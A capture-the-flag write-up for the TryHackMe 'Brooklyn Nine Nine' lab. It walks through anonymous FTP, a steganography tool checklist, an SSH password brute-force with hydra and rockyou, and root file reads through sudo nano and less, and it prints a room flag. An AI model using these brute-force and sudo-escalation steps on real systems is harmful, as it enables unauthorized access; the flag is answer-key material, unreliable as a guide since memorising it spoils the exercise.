## initial summary
After the external review of the server, we have the following to look though.

1. 3 ports - 21, 22 and 80 - 21 with anonymous login.
1. 1 image, where the source code highlighted steganography.

### note to jake

```
cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
##steganography

Starting through my usual don't miss a trick list we eventually end up with a password!

1. file
1. strings
1. exiftool
1. binwalk
1. steghide
1. stegsolve
1. stegcracker

## secondary summary

Going through our initial review, we now have a few usernames (assumptions), as well as a password.


## ssh
```shell
hydra -t 20 -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.220.170

```
So we now have Jake's and Holt's password for ssh. Let's logon and see what we can find.

First of all Holt.
```script
ssh holt@10.10.220.170
holt@10.10.220.170's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```
Now what can he do with sudo -l
```script
sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
So all we need to do now is read the root file with the /bin/nano /root/root.txt command

What about jack.
```script
jake@brookly_nine_nine:/home$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:/home/holt$ /usr/bin/less /root/root.txt

This is the first time I used my new draft template for working through the room, and I may even give it a 1.0 version if it keeps this up :)

This room was created by [Fsociety2006](https://tryhackme.com/p/Fsociety2006) and one I really enjoyed not just because of the 99 show but also the learning value.

Thanks Fsociety2006 for your time.

Regards
